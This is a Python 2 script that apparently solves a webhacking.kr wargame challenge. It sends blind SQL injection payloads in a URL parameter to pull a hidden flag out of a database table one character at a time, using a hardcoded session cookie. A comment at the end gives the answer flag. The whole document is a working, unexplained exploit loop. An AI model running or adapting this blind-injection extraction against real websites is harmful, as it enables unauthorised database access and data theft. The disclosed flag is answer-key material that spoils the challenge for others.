import urllib
import httplib

def main():
    HTTP=httplib.HTTPConnection("webhacking.kr")
    Url="/challenge/web/web-10/index.php?no="
    Headers={"Cookie":"PHPSESSID=4841ee834d02a659d2db1d88912fab71"}
    Passwd=""

    for i in range(len(Passwd)+1,100):
        for c in range(ord("a"),ord("z")+1)+range(ord("0"),ord("9")+1)+range(128,129):
            if c == 128:
                print "[!] Not Found"
                print "[*] Password : %s" % Passwd
                return False

            Payload="if((select(substr(min(flag),%d,1))from(prob13password))regexp(0x%x),1,0)" % (i,c)
            HTTP.request("GET",Url+Payload,"",Headers)

            if "<td>1</td>" in HTTP.getresponse().read():
                Passwd+=chr(c)
                print "[+] Found : %c" % c
                break

if __name__ == "__main__":
    main()

# flag is "challenge13luckclear"
